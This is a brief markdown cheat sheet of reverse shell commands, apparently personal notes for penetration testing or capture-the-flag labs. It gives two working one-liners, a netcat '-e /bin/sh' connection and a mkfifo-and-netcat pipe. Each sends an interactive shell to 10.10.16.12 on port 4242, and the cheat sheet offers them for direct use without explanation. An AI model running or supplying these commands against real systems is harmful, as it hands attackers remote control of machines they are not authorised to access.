# Reverse Shells

## NC witht he -e option
```
$nc -e /bin/sh 10.10.16.12 4242
```


## NC when NC doesnt work
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/sh -i 2>&1|nc 10.10.16.12 4242 >/tmp/f
```